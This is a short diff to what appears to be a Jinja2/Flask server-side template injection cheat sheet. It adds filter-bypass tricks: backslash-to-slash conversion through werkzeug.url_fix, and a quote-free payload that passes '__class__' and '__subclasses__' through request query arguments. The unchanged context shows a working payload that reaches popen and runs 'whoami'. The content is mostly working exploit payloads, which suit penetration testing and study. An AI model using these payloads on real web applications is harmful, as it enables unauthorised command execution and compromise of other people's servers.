@@ -54,6 +54,10 @@ Method 2:
 {% print self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__["popen"]("whoami").read()[0] %}
 ```
 
+#### [^/]
+
+`werkzeug.url_fix` converts `\` into `/` (dependent on source code)
+
 #### [^\.]
 
 ```py
@@ -74,6 +78,13 @@ Method 2:
 #### [^'"]
 
 This one is more advanced. We can exploit the built-in request Object in Flask to pass in any strings we like.
+
+For example: 
+```py
+{{ ''[request.args.get('class')].mro()[1][request.args.get('subclasses')]() }}
+```
+
+`http://url.com/?class=__class__&subclasses=__subclasses__`
 
 #### Cookies
 
